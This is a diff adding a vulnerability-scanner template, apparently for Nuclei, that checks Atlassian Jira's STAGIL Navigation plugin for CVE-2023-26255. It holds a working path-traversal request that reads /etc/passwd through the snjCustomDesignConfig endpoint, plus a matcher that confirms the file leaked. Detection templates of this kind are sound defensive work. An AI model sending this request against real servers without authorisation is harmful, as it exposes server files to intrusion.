@@ -1,0 +1,28 @@
+id: cve-2023-26255
+info:
+  name: Atlassian Jira snjCustomDesignConfig Arbitrary File Read
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Atlassian Jira plugin STAGIL Navigation before 2.0.52 contains a path traversal vulnerability in the `snjCustomDesignConfig` endpoint, allowing attackers to read arbitrary files from the filesystem.
+  classification:
+    cve-id: CVE-2023-26255
+    cvss-metrics: 3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
+    cvss-score: 7.5
+  tags: file-read
+  reference:
+    - https://github.com/1nters3ct/CVEs/blob/main/CVE-2023-26255.md
+http:
+  - raw:
+      - |
+        GET /plugins/servlet/snjCustomDesignConfig?fileName=../../../../etc/passwd&fileMime=$textMime HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "root:.*:0:0:"
